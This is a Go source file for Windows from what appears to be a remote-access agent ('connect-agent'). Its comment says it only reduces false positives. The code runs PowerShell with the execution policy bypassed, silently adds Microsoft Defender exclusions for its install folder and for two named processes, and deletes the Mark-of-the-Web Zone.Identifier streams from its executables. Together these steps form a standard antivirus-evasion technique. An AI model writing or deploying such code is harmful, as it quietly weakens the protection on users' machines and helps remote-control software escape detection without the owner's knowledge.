//go:build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// allowInstallDirInDefender adds a narrow exclusion for the agent folder while elevated.
// Never turns Defender off — only reduces false positives for our own binaries.
func allowInstallDirInDefender() {
	dir := filepath.Dir(mustAgentExe())
	if local := os.Getenv("LOCALAPPDATA"); local != "" {
		preferred := filepath.Join(local, "Connect")
		if st, err := os.Stat(filepath.Join(preferred, "connect-agent.exe")); err == nil && !st.IsDir() {
			dir = preferred
		}
	}
	ps := strings.Join([]string{
		"$p='" + strings.ReplaceAll(dir, "'", "''") + "'",
		"try {",
		"  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
		"    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue",
		"    Add-MpPreference -ExclusionProcess 'connect-agent.exe' -ErrorAction SilentlyContinue",
		"    Add-MpPreference -ExclusionProcess 'WorthyJoin-Host.exe' -ErrorAction SilentlyContinue",
		"  }",
		"} catch {}",
	}, "; ")
	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err := cmd.Run(); err != nil {
		log.Printf("connect-agent: defender allow-list skipped: %v", err)
		return
	}
	log.Printf("connect-agent: defender allow-list path %s", dir)
	_ = os.Remove(filepath.Join(dir, "connect-agent.exe") + ":Zone.Identifier")
	_ = os.Remove(filepath.Join(dir, "WorthyJoin-Host.exe") + ":Zone.Identifier")
}

func mustAgentExe() string {
	exe, err := os.Executable()
	if err != nil || exe == "" {
		return "."
	}
	return exe
}
